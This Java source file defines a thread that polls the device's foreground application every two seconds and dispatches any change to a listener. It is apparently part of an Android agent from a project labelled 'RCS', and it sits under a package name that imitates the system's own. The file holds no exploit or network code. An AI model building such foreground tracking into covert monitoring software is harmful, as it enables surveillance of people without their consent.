/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : BroadcastMonitorProcess.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.listener;

import com.android.dvci.RunningProcesses;
import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.util.Check;

public class BroadcastMonitorProcess extends Thread {

	/** The Constant TAG. */
	private static final String TAG = "BroadcastMonitorProcess"; //$NON-NLS-1$

	private boolean stop;
	private final int period;
	String oldForeDigest = "";

	

	private ListenerProcess listenerProcess;

	public BroadcastMonitorProcess() {
		stop = false;
		period = 2000; // Poll interval
		
		
		if (Cfg.DEBUG) {
			setName(getClass().getSimpleName());
		}
	}

	@Override
	public void run() {
		while (!stop) {
			
			String foreDigest = Status.self().getForeground();

			if (!foreDigest.equals(oldForeDigest)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (run), changed fore, dispatching");
				}
				oldForeDigest = foreDigest;

				listenerProcess.dispatch(foreDigest);
			}

			try {
				synchronized (this) {
					wait(period);
				}
			} catch (final InterruptedException e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(e);//$NON-NLS-1$
				}
			}
		} ;
	}

	synchronized void register(ListenerProcess listenerProcess) {
		stop = false;
		this.listenerProcess = listenerProcess;
	}

	synchronized void unregister() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (unregister)");
		}
		stop = true;
		notifyAll();
	}
}
